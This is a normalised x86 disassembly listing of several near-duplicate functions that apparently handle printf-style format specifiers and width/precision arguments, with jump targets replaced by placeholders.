call sub_426c24
dec eax
sub eax 0x1
je r-xdata
mov ecx esi
call sub_4268d0
jmp r-xdata
cmp eax 0x67
jle r-xdata
test al al
jne r-xdata
sub eax 0x5a
je r-xdata
je r-xdata
cmp [ esi + 0x30 ] bl
jne r-xdata
xor al al
jmp r-xdata
push ebx
push 0xa
sub eax 0x3
jne r-xdata
mov ecx esi
call sub_423f10
jmp r-xdata
cmp eax 0x69
je r-xdata
mov ecx esi
call sub_42342c
jmp r-xdata
sub eax 0x7
je r-xdata
push 0x1
cmp eax edx
je r-xdata
mov al 0x1
mov edx [ esi + 0x20 ]
xor ecx ecx
push edi
mov eax edx
mov [ ebp - 0xc ] ebx
shr eax 0x4
inc ecx
mov [ ebp - 0x8 ] bx
push 0x20
pop edi
test cl al
je r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn
push ebx
jmp r-xdata
cmp eax 0x6e
je r-xdata
dec eax
sub eax 0x1
jne r-xdata
mov ecx esi
call sub_4258a4
jmp r-xdata
cmp eax 0x43
je r-xdata
movzx ecx [ esi + 0x32 ]
cmp ecx 0x78
je r-xdata
mov eax edx
shr eax 0x6
test cl al
je r-xdata
push 0x10
jmp r-xdata
mov ecx esi
call sub_4263ca
jmp r-xdata
cmp eax 0x6f
jne r-xdata
push ebx
mov ecx esi
call sub_424c1a
jmp r-xdata
cmp eax 0x44
jle r-xdata
mov eax edx
shr eax 0x5
test al 0x1
je r-xdata
push 0x58
pop eax
cmp cx ax
jne r-xdata
test cl dl
je r-xdata
push 0x2d
mov ecx esi
call sub_426786
jmp r-xdata
cmp eax 0x47
jle r-xdata
xor ah ah
mov ah 0x1
jmp r-xdata
mov eax edx
shr eax 0x1
test cl al
je r-xdata
push 0x2b
jmp r-xdata
mov ebx ecx
cmp eax 0x53
jne r-xdata
mov al 0x1
push 0x41
pop edi
cmp cx di
je r-xdata
cmp ecx 0x61
je r-xdata
mov [ ebp - 0xc ] di
pop eax
mov [ ebp - 0xc ] ax
jmp r-xdata
push 0x58
pop eax
mov [ ebp + ebx * 2 - 0xc ] di
cmp cx ax
je r-xdata
test al al
je r-xdata
xor al al
jmp r-xdata
mov al 0x1
push 0x41
pop eax
cmp cx ax
je r-xdata
mov edi [ esi + 0x24 ]
sub edi [ esi + 0x38 ]
sub edi ebx
test dl 0xc
jne r-xdata
push 0x30
pop edi
test ah ah
jne r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push ebx
lea eax [ ebp - 0xc ]
lea ecx [ esi + 0x448 ]
push eax
call sub_428bf9
mov ecx [ esi + 0x20 ]
lea ebx [ esi + 0x18 ]
mov eax ecx
shr eax 0x3
test al 0x1
je r-xdata
lea eax [ esi + 0x18 ]
push eax
push edi
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_41c573
add esp 0x10
xor al al
jmp r-xdata
push 0x0
mov ecx esi
call sub_42882d
cmp [ ebx ] 0x0
jl r-xdata
shr ecx 0x2
test cl 0x1
jne r-xdata
test al al
sete al
dec al
and al 0xe0
add al 0x78
cbw
mov [ ebp + ebx * 2 - 0xa ] ax
add ebx 0x2
pop edi
mov eax [ esi + 0x20 ]
shr eax 0x2
test al 0x1
je r-xdata
push ebx
push edi
lea eax [ esi + 0x448 ]
push 0x30
push eax
call sub_41c573
add esp 0x10
push ebx
push edi
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_41c573
add esp 0x10
sub_422231
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi ecx
xor ebx ebx
push 0x41
pop edx
push 0x58
movzx eax [ esi + 0x32 ]
pop ecx
cmp eax 0x64
jg r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ esi + 0x20 ] 0x10
cmp eax ecx
jg r-xdata
mov ecx esi
call sub_426c98
dec eax
sub eax 0x1
je r-xdata
mov ecx esi
call sub_4268e8
jmp r-xdata
cmp eax 0x67
jle r-xdata
test al al
jne r-xdata
sub eax 0x5a
je r-xdata
je r-xdata
mov ecx esi
call sub_41f4b8
test al al
jne r-xdata
xor al al
jmp r-xdata
push ebx
push 0xa
sub eax 0x3
jne r-xdata
mov ecx esi
call sub_424082
jmp r-xdata
cmp eax 0x69
je r-xdata
mov ecx esi
call sub_42348f
jmp r-xdata
sub eax 0x7
je r-xdata
push 0x1
cmp eax edx
je r-xdata
mov al 0x1
cmp [ esi + 0x30 ] bl
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn
push ebx
jmp r-xdata
cmp eax 0x6e
je r-xdata
dec eax
sub eax 0x1
jne r-xdata
mov ecx esi
call sub_4259ee
jmp r-xdata
cmp eax 0x43
je r-xdata
mov edx [ esi + 0x20 ]
xor ecx ecx
push edi
mov eax edx
mov [ ebp - 0xc ] ebx
shr eax 0x4
inc ecx
mov [ ebp - 0x8 ] bx
push 0x20
pop edi
test cl al
je r-xdata
push 0x10
jmp r-xdata
mov ecx esi
call sub_42643e
jmp r-xdata
cmp eax 0x6f
jne r-xdata
push ebx
mov ecx esi
call sub_424cb2
jmp r-xdata
cmp eax 0x44
jle r-xdata
movzx ecx [ esi + 0x32 ]
cmp ecx 0x78
je r-xdata
mov eax edx
shr eax 0x6
test cl al
je r-xdata
mov ecx esi
call sub_4267a5
jmp r-xdata
cmp eax 0x47
jle r-xdata
mov eax edx
shr eax 0x5
test al 0x1
je r-xdata
push 0x58
pop eax
cmp cx ax
jne r-xdata
test cl dl
je r-xdata
push 0x2d
cmp eax 0x53
jne r-xdata
xor ah ah
mov ah 0x1
jmp r-xdata
mov eax edx
shr eax 0x1
test cl al
je r-xdata
push 0x2b
jmp r-xdata
mov ebx ecx
mov al 0x1
push 0x41
pop edi
cmp cx di
je r-xdata
cmp ecx 0x61
je r-xdata
mov [ ebp - 0xc ] di
pop eax
mov [ ebp - 0xc ] ax
jmp r-xdata
push 0x58
pop eax
mov [ ebp + ebx * 2 - 0xc ] di
cmp cx ax
je r-xdata
test al al
je r-xdata
xor al al
jmp r-xdata
mov al 0x1
push 0x41
pop eax
cmp cx ax
je r-xdata
mov edi [ esi + 0x24 ]
sub edi [ esi + 0x38 ]
sub edi ebx
test dl 0xc
jne r-xdata
push 0x30
pop edi
test ah ah
jne r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push ebx
lea eax [ ebp - 0xc ]
lea ecx [ esi + 0x448 ]
push eax
call sub_428bf9
mov ecx [ esi + 0x20 ]
lea ebx [ esi + 0x18 ]
mov eax ecx
shr eax 0x3
test al 0x1
je r-xdata
lea eax [ esi + 0x18 ]
push eax
push edi
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_41c573
add esp 0x10
xor al al
jmp r-xdata
push 0x0
mov ecx esi
call sub_4288b8
cmp [ ebx ] 0x0
jl r-xdata
shr ecx 0x2
test cl 0x1
jne r-xdata
test al al
sete al
dec al
and al 0xe0
add al 0x78
cbw
mov [ ebp + ebx * 2 - 0xa ] ax
add ebx 0x2
pop edi
mov eax [ esi + 0x20 ]
shr eax 0x2
test al 0x1
je r-xdata
push ebx
push edi
lea eax [ esi + 0x448 ]
push 0x30
push eax
call sub_41c573
add esp 0x10
push ebx
push edi
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_41c573
add esp 0x10
sub_42249d
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi ecx
xor ebx ebx
push 0x41
pop edx
push 0x58
movzx eax [ esi + 0x32 ]
pop ecx
cmp eax 0x64
jg r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ esi + 0x20 ] 0x10
cmp eax ecx
jg r-xdata
mov ecx esi
call sub_426d16
dec eax
sub eax 0x1
je r-xdata
mov ecx esi
call sub_426900
jmp r-xdata
cmp eax 0x67
jle r-xdata
test al al
jne r-xdata
sub eax 0x5a
je r-xdata
je r-xdata
cmp [ esi + 0x30 ] bl
jne r-xdata
xor al al
jmp r-xdata
push ebx
push 0xa
sub eax 0x3
jne r-xdata
mov ecx esi
call sub_424213
jmp r-xdata
cmp eax 0x69
je r-xdata
mov ecx esi
call sub_42350e
jmp r-xdata
sub eax 0x7
je r-xdata
push 0x1
cmp eax edx
je r-xdata
mov al 0x1
mov edx [ esi + 0x20 ]
xor ecx ecx
push edi
mov eax edx
mov [ ebp - 0xc ] ebx
shr eax 0x4
inc ecx
mov [ ebp - 0x8 ] bx
push 0x20
pop edi
test cl al
je r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn
push ebx
jmp r-xdata
cmp eax 0x6e
je r-xdata
dec eax
sub eax 0x1
jne r-xdata
mov ecx esi
call sub_425b6c
jmp r-xdata
cmp eax 0x43
je r-xdata
movzx ecx [ esi + 0x32 ]
cmp ecx 0x78
je r-xdata
mov eax edx
shr eax 0x6
test cl al
je r-xdata
push 0x10
jmp r-xdata
mov ecx esi
call sub_4264d7
jmp r-xdata
cmp eax 0x6f
jne r-xdata
push ebx
mov ecx esi
call sub_424d61
jmp r-xdata
cmp eax 0x44
jle r-xdata
mov eax edx
shr eax 0x5
test al 0x1
je r-xdata
push 0x58
pop eax
cmp cx ax
jne r-xdata
test cl dl
je r-xdata
push 0x2d
mov ecx esi
call sub_4267c4
jmp r-xdata
cmp eax 0x47
jle r-xdata
xor ah ah
mov ah 0x1
jmp r-xdata
mov eax edx
shr eax 0x1
test cl al
je r-xdata
push 0x2b
jmp r-xdata
mov ebx ecx
cmp eax 0x53
jne r-xdata
mov al 0x1
push 0x41
pop edi
cmp cx di
je r-xdata
cmp ecx 0x61
je r-xdata
mov [ ebp - 0xc ] di
pop eax
mov [ ebp - 0xc ] ax
jmp r-xdata
push 0x58
pop eax
mov [ ebp + ebx * 2 - 0xc ] di
cmp cx ax
je r-xdata
test al al
je r-xdata
xor al al
jmp r-xdata
mov al 0x1
push 0x41
pop eax
cmp cx ax
je r-xdata
mov edi [ esi + 0x24 ]
sub edi [ esi + 0x38 ]
sub edi ebx
test dl 0xc
jne r-xdata
push 0x30
pop edi
test ah ah
jne r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push ebx
lea eax [ ebp - 0xc ]
lea ecx [ esi + 0x448 ]
push eax
call sub_428bf9
mov ecx [ esi + 0x20 ]
lea ebx [ esi + 0x18 ]
mov eax ecx
shr eax 0x3
test al 0x1
je r-xdata
lea eax [ esi + 0x18 ]
push eax
push edi
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_41c573
add esp 0x10
xor al al
jmp r-xdata
push 0x0
mov ecx esi
call sub_428943
cmp [ ebx ] 0x0
jl r-xdata
shr ecx 0x2
test cl 0x1
jne r-xdata
test al al
sete al
dec al
and al 0xe0
add al 0x78
cbw
mov [ ebp + ebx * 2 - 0xa ] ax
add ebx 0x2
pop edi
mov eax [ esi + 0x20 ]
shr eax 0x2
test al 0x1
je r-xdata
push ebx
push edi
lea eax [ esi + 0x448 ]
push 0x30
push eax
call sub_41c573
add esp 0x10
push ebx
push edi
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_41c573
add esp 0x10
sub_4226fa
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi ecx
xor ebx ebx
push 0x41
pop edx
push 0x58
movzx eax [ esi + 0x32 ]
pop ecx
cmp eax 0x64
jg r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ esi + 0x20 ] 0x10
cmp eax ecx
jg r-xdata
mov ecx esi
call sub_426d8a
dec eax
sub eax 0x1
je r-xdata
mov ecx esi
call sub_426918
jmp r-xdata
cmp eax 0x67
jle r-xdata
test al al
jne r-xdata
sub eax 0x5a
je r-xdata
je r-xdata
cmp [ esi + 0x30 ] bl
jne r-xdata
xor al al
jmp r-xdata
push ebx
push 0xa
sub eax 0x3
jne r-xdata
mov ecx esi
call sub_424385
jmp r-xdata
cmp eax 0x69
je r-xdata
mov ecx esi
call sub_423571
jmp r-xdata
sub eax 0x7
je r-xdata
push 0x1
cmp eax edx
je r-xdata
mov al 0x1
mov edx [ esi + 0x20 ]
xor ecx ecx
push edi
mov eax edx
mov [ ebp - 0xc ] ebx
shr eax 0x4
inc ecx
mov [ ebp - 0x8 ] bx
push 0x20
pop edi
test cl al
je r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn
push ebx
jmp r-xdata
cmp eax 0x6e
je r-xdata
dec eax
sub eax 0x1
jne r-xdata
mov ecx esi
call sub_425cb6
jmp r-xdata
cmp eax 0x43
je r-xdata
movzx ecx [ esi + 0x32 ]
cmp ecx 0x78
je r-xdata
mov eax edx
shr eax 0x6
test cl al
je r-xdata
push 0x10
jmp r-xdata
mov ecx esi
call sub_42654b
jmp r-xdata
cmp eax 0x6f
jne r-xdata
push ebx
mov ecx esi
call sub_424df9
jmp r-xdata
cmp eax 0x44
jle r-xdata
mov eax edx
shr eax 0x5
test al 0x1
je r-xdata
push 0x58
pop eax
cmp cx ax
jne r-xdata
test cl dl
je r-xdata
push 0x2d
mov ecx esi
call sub_4267e3
jmp r-xdata
cmp eax 0x47
jle r-xdata
xor ah ah
mov ah 0x1
jmp r-xdata
mov eax edx
shr eax 0x1
test cl al
je r-xdata
push 0x2b
jmp r-xdata
mov ebx ecx
cmp eax 0x53
jne r-xdata
mov al 0x1
push 0x41
pop edi
cmp cx di
je r-xdata
cmp ecx 0x61
je r-xdata
mov [ ebp - 0xc ] di
pop eax
mov [ ebp - 0xc ] ax
jmp r-xdata
push 0x58
pop eax
mov [ ebp + ebx * 2 - 0xc ] di
cmp cx ax
je r-xdata
test al al
je r-xdata
xor al al
jmp r-xdata
mov al 0x1
push 0x41
pop eax
cmp cx ax
je r-xdata
mov edi [ esi + 0x24 ]
sub edi [ esi + 0x38 ]
sub edi ebx
test dl 0xc
jne r-xdata
push 0x30
pop edi
test ah ah
jne r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push ebx
lea eax [ ebp - 0xc ]
lea ecx [ esi + 0x448 ]
push eax
call sub_428d19
mov ecx [ esi + 0x20 ]
lea ebx [ esi + 0x18 ]
mov eax ecx
shr eax 0x3
test al 0x1
je r-xdata
lea eax [ esi + 0x18 ]
push eax
push edi
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_41c5d0
add esp 0x10
xor al al
jmp r-xdata
push 0x0
mov ecx esi
call sub_4289ce
cmp [ ebx ] 0x0
jl r-xdata
shr ecx 0x2
test cl 0x1
jne r-xdata
test al al
sete al
dec al
and al 0xe0
add al 0x78
cbw
mov [ ebp + ebx * 2 - 0xa ] ax
add ebx 0x2
pop edi
mov eax [ esi + 0x20 ]
shr eax 0x2
test al 0x1
je r-xdata
push ebx
push edi
lea eax [ esi + 0x448 ]
push 0x30
push eax
call sub_41c5d0
add esp 0x10
push ebx
push edi
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_41c5d0
add esp 0x10
sub_422957
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi ecx
xor ebx ebx
push 0x41
pop edx
push 0x58
movzx eax [ esi + 0x32 ]
pop ecx
cmp eax 0x64
jg r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ esi + 0x20 ] 0x10
cmp eax ecx
jg r-xdata
mov ecx esi
call sub_426dfe
dec eax
sub eax 0x1
je r-xdata
mov ecx esi
call sub_426930
jmp r-xdata
cmp eax 0x67
jle r-xdata
test al al
jne r-xdata
sub eax 0x5a
je r-xdata
je r-xdata
mov ecx esi
call sub_41f4cf
test al al
jne r-xdata
xor al al
jmp r-xdata
push ebx
push 0xa
sub eax 0x3
jne r-xdata
mov ecx esi
call sub_4244f7
jmp r-xdata
cmp eax 0x69
je r-xdata
mov ecx esi
call sub_4235d4
jmp r-xdata
sub eax 0x7
je r-xdata
push 0x1
cmp eax edx
je r-xdata
mov al 0x1
cmp [ esi + 0x30 ] bl
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn
push ebx
jmp r-xdata
cmp eax 0x6e
je r-xdata
dec eax
sub eax 0x1
jne r-xdata
mov ecx esi
call sub_425e00
jmp r-xdata
cmp eax 0x43
je r-xdata
mov edx [ esi + 0x20 ]
xor ecx ecx
push edi
mov eax edx
mov [ ebp - 0xc ] ebx
shr eax 0x4
inc ecx
mov [ ebp - 0x8 ] bx
push 0x20
pop edi
test cl al
je r-xdata
push 0x10
jmp r-xdata
mov ecx esi
call sub_4265bf
jmp r-xdata
cmp eax 0x6f
jne r-xdata
push ebx
mov ecx esi
call sub_424e91
jmp r-xdata
cmp eax 0x44
jle r-xdata
movzx ecx [ esi + 0x32 ]
cmp ecx 0x78
je r-xdata
mov eax edx
shr eax 0x6
test cl al
je r-xdata
mov ecx esi
call sub_426802
jmp r-xdata
cmp eax 0x47
jle r-xdata
mov eax edx
shr eax 0x5
test al 0x1
je r-xdata
push 0x58
pop eax
cmp cx ax
jne r-xdata
test cl dl
je r-xdata
push 0x2d
cmp eax 0x53
jne r-xdata
xor ah ah
mov ah 0x1
jmp r-xdata
mov eax edx
shr eax 0x1
test cl al
je r-xdata
push 0x2b
jmp r-xdata
mov ebx ecx
mov al 0x1
push 0x41
pop edi
cmp cx di
je r-xdata
cmp ecx 0x61
je r-xdata
mov [ ebp - 0xc ] di
pop eax
mov [ ebp - 0xc ] ax
jmp r-xdata
push 0x58
pop eax
mov [ ebp + ebx * 2 - 0xc ] di
cmp cx ax
je r-xdata
test al al
je r-xdata
xor al al
jmp r-xdata
mov al 0x1
push 0x41
pop eax
cmp cx ax
je r-xdata
mov edi [ esi + 0x24 ]
sub edi [ esi + 0x38 ]
sub edi ebx
test dl 0xc
jne r-xdata
push 0x30
pop edi
test ah ah
jne r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push ebx
lea eax [ ebp - 0xc ]
lea ecx [ esi + 0x448 ]
push eax
call sub_428d19
mov ecx [ esi + 0x20 ]
lea ebx [ esi + 0x18 ]
mov eax ecx
shr eax 0x3
test al 0x1
je r-xdata
lea eax [ esi + 0x18 ]
push eax
push edi
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_41c5d0
add esp 0x10
xor al al
jmp r-xdata
push 0x0
mov ecx esi
call sub_428a59
cmp [ ebx ] 0x0
jl r-xdata
shr ecx 0x2
test cl 0x1
jne r-xdata
test al al
sete al
dec al
and al 0xe0
add al 0x78
cbw
mov [ ebp + ebx * 2 - 0xa ] ax
add ebx 0x2
pop edi
mov eax [ esi + 0x20 ]
shr eax 0x2
test al 0x1
je r-xdata
push ebx
push edi
lea eax [ esi + 0x448 ]
push 0x30
push eax
call sub_41c5d0
add esp 0x10
push ebx
push edi
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_41c5d0
add esp 0x10
sub_422bc3
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi ecx
xor ebx ebx
push 0x41
pop edx
push 0x58
movzx eax [ esi + 0x32 ]
pop ecx
cmp eax 0x64
jg r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ esi + 0x20 ] 0x10
cmp eax ecx
jg r-xdata
mov ecx esi
call sub_426e7c
dec eax
sub eax 0x1
je r-xdata
mov ecx esi
call sub_426948
jmp r-xdata
cmp eax 0x67
jle r-xdata
test al al
jne r-xdata
sub eax 0x5a
je r-xdata
je r-xdata
cmp [ esi + 0x30 ] bl
jne r-xdata
xor al al
jmp r-xdata
push ebx
push 0xa
sub eax 0x3
jne r-xdata
mov ecx esi
call sub_424688
jmp r-xdata
cmp eax 0x69
je r-xdata
mov ecx esi
call sub_423653
jmp r-xdata
sub eax 0x7
je r-xdata
push 0x1
cmp eax edx
je r-xdata
mov al 0x1
mov edx [ esi + 0x20 ]
xor ecx ecx
push edi
mov eax edx
mov [ ebp - 0xc ] ebx
shr eax 0x4
inc ecx
mov [ ebp - 0x8 ] bx
push 0x20
pop edi
test cl al
je r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn
push ebx
jmp r-xdata
cmp eax 0x6e
je r-xdata
dec eax
sub eax 0x1
jne r-xdata
mov ecx esi
call sub_425f7e
jmp r-xdata
cmp eax 0x43
je r-xdata
movzx ecx [ esi + 0x32 ]
cmp ecx 0x78
je r-xdata
mov eax edx
shr eax 0x6
test cl al
je r-xdata
push 0x10
jmp r-xdata
mov ecx esi
call sub_426658
jmp r-xdata
cmp eax 0x6f
jne r-xdata
push ebx
mov ecx esi
call sub_424f40
jmp r-xdata
cmp eax 0x44
jle r-xdata
mov eax edx
shr eax 0x5
test al 0x1
je r-xdata
push 0x58
pop eax
cmp cx ax
jne r-xdata
test cl dl
je r-xdata
push 0x2d
mov ecx esi
call sub_426821
jmp r-xdata
cmp eax 0x47
jle r-xdata
xor ah ah
mov ah 0x1
jmp r-xdata
mov eax edx
shr eax 0x1
test cl al
je r-xdata
push 0x2b
jmp r-xdata
mov ebx ecx
cmp eax 0x53
jne r-xdata
mov al 0x1
push 0x41
pop edi
cmp cx di
je r-xdata
cmp ecx 0x61
je r-xdata
mov [ ebp - 0xc ] di
pop eax
mov [ ebp - 0xc ] ax
jmp r-xdata
push 0x58
pop eax
mov [ ebp + ebx * 2 - 0xc ] di
cmp cx ax
je r-xdata
test al al
je r-xdata
xor al al
jmp r-xdata
mov al 0x1
push 0x41
pop eax
cmp cx ax
je r-xdata
mov edi [ esi + 0x24 ]
sub edi [ esi + 0x38 ]
sub edi ebx
test dl 0xc
jne r-xdata
push 0x30
pop edi
test ah ah
jne r-xdata
push [ esi + 0xc ]
lea eax [ esi + 0x18 ]
push eax
push ebx
lea eax [ ebp - 0xc ]
lea ecx [ esi + 0x448 ]
push eax
call sub_428d19
mov ecx [ esi + 0x20 ]
lea ebx [ esi + 0x18 ]
mov eax ecx
shr eax 0x3
test al 0x1
je r-xdata
lea eax [ esi + 0x18 ]
push eax
push edi
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_41c5d0
add esp 0x10
xor al al
jmp r-xdata
push 0x0
mov ecx esi
call sub_428ae4
cmp [ ebx ] 0x0
jl r-xdata
shr ecx 0x2
test cl 0x1
jne r-xdata
test al al
sete al
dec al
and al 0xe0
add al 0x78
cbw
mov [ ebp + ebx * 2 - 0xa ] ax
add ebx 0x2
pop edi
mov eax [ esi + 0x20 ]
shr eax 0x2
test al 0x1
je r-xdata
push ebx
push edi
lea eax [ esi + 0x448 ]
push 0x30
push eax
call sub_41c5d0
add esp 0x10
push ebx
push edi
lea eax [ esi + 0x448 ]
push 0x20
push eax
call sub_41c5d0
add esp 0x10
sub_422e20
cmp [ ecx + 0x31 ] 0x2a
je r-xdata
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x24 ] eax
test eax eax
jns r-xdata
lea eax [ ecx + 0x24 ]
push eax
call sub_41dfca
retn
mov al 0x1
retn
or [ ecx + 0x20 ] 0x4
neg [ ecx + 0x24 ]
sub_422e4b
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x31 ] 0x2a
je r-xdata
call sub_4272b0
test al al
jne r-xdata
lea eax [ esi + 0x24 ]
push eax
call sub_41e026
pop esi
retn
mov ecx esi
call sub_41f37a
test al al
je r-xdata
pop esi
retn
mov al 0x1
pop esi
retn
mov eax [ esi + 0x24 ]
test eax eax
jns r-xdata
or [ esi + 0x20 ] 0x4
neg eax
mov [ esi + 0x24 ] eax
sub_422e8b
cmp [ ecx + 0x31 ] 0x2a
je r-xdata
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x24 ] eax
test eax eax
jns r-xdata
lea eax [ ecx + 0x24 ]
push eax
call sub_41e082
retn
mov al 0x1
retn
or [ ecx + 0x20 ] 0x4
neg [ ecx + 0x24 ]
sub_422eb6
cmp [ ecx + 0x31 ] 0x2a
je r-xdata
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x24 ] eax
test eax eax
jns r-xdata
lea eax [ ecx + 0x24 ]
push eax
call sub_41e0de
retn
mov al 0x1
retn
or [ ecx + 0x20 ] 0x4
neg [ ecx + 0x24 ]
sub_422ee1
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x31 ] 0x2a
je r-xdata
call sub_427366
test al al
jne r-xdata
lea eax [ esi + 0x24 ]
push eax
call sub_41e13a
pop esi
retn
mov ecx esi
call sub_41f390
test al al
je r-xdata
pop esi
retn
mov al 0x1
pop esi
retn
mov eax [ esi + 0x24 ]
test eax eax
jns r-xdata
or [ esi + 0x20 ] 0x4
neg eax
mov [ esi + 0x24 ] eax
sub_422f21
cmp [ ecx + 0x31 ] 0x2a
je r-xdata
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x24 ] eax
test eax eax
jns r-xdata
lea eax [ ecx + 0x24 ]
push eax
call sub_41e196
retn
mov al 0x1
retn
or [ ecx + 0x20 ] 0x4
neg [ ecx + 0x24 ]
sub_422f4c
cmp [ ecx + 0x32 ] 0x2a
je r-xdata
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x24 ] eax
test eax eax
jns r-xdata
lea eax [ ecx + 0x24 ]
push eax
call sub_41e1f2
retn
mov al 0x1
retn
or [ ecx + 0x20 ] 0x4
neg [ ecx + 0x24 ]
sub_422f78
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x32 ] 0x2a
je r-xdata
call sub_42741c
test al al
jne r-xdata
lea eax [ esi + 0x24 ]
push eax
call sub_41e250
pop esi
retn
mov ecx esi
call sub_41f3a6
test al al
je r-xdata
pop esi
retn
mov al 0x1
pop esi
retn
mov eax [ esi + 0x24 ]
test eax eax
jns r-xdata
or [ esi + 0x20 ] 0x4
neg eax
mov [ esi + 0x24 ] eax
sub_422fb9
cmp [ ecx + 0x32 ] 0x2a
je r-xdata
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x24 ] eax
test eax eax
jns r-xdata
lea eax [ ecx + 0x24 ]
push eax
call sub_41e2ae
retn
mov al 0x1
retn
or [ ecx + 0x20 ] 0x4
neg [ ecx + 0x24 ]
sub_422fe5
cmp [ ecx + 0x32 ] 0x2a
je r-xdata
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x24 ] eax
test eax eax
jns r-xdata
lea eax [ ecx + 0x24 ]
push eax
call sub_41e30c
retn
mov al 0x1
retn
or [ ecx + 0x20 ] 0x4
neg [ ecx + 0x24 ]
sub_423011
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x32 ] 0x2a
je r-xdata
call sub_4274d3
test al al
jne r-xdata
lea eax [ esi + 0x24 ]
push eax
call sub_41e36a
pop esi
retn
mov ecx esi
call sub_41f3bc
test al al
je r-xdata
pop esi
retn
mov al 0x1
pop esi
retn
mov eax [ esi + 0x24 ]
test eax eax
jns r-xdata
or [ esi + 0x20 ] 0x4
neg eax
mov [ esi + 0x24 ] eax
sub_423052
cmp [ ecx + 0x32 ] 0x2a
je r-xdata
add [ ecx + 0x14 ] 0x4
mov eax [ ecx + 0x14 ]
mov eax [ eax - 0x4 ]
mov [ ecx + 0x24 ] eax
test eax eax
jns r-xdata
lea eax [ ecx + 0x24 ]
push eax
call sub_41e3c8
retn
mov al 0x1
retn
or [ ecx + 0x20 ] 0x4
neg [ ecx + 0x24 ]
sub_4230ce
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xb
ja r-xdata
xor eax eax
pop ebp
retn
jmp [ eax * 4 + jump_table_4230fa ]
push 0x4
xor eax eax
inc eax
pop ebp
retn
push 0x2
jmp r-xdata
push 0x8
jmp r-xdata
pop eax
pop ebp
retn
sub_4231a2
mov edi edi
push ebx
push esi
mov esi ecx
push edi
add [ esi + 0x14 ] 0x4
mov eax [ esi + 0x14 ]
mov edi [ eax - 0x4 ]
test edi edi
je r-xdata
mov [ esi + 0x34 ] r--data
mov [ esi + 0x38 ] 0x6
mov ebx [ edi + 0x4 ]
test ebx ebx
je r-xdata
push [ esi + 0x2c ]
movzx eax [ esi + 0x31 ]
push eax
push [ esi + 0x4 ]
push [ esi ]
call sub_41b585
add esp 0x10
mov [ esi + 0x34 ] ebx
test al al
movzx eax [ edi ]
je r-xdata
mov [ esi + 0x38 ] eax
jmp r-xdata
shr eax 0x1
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] 0x1
jmp r-xdata
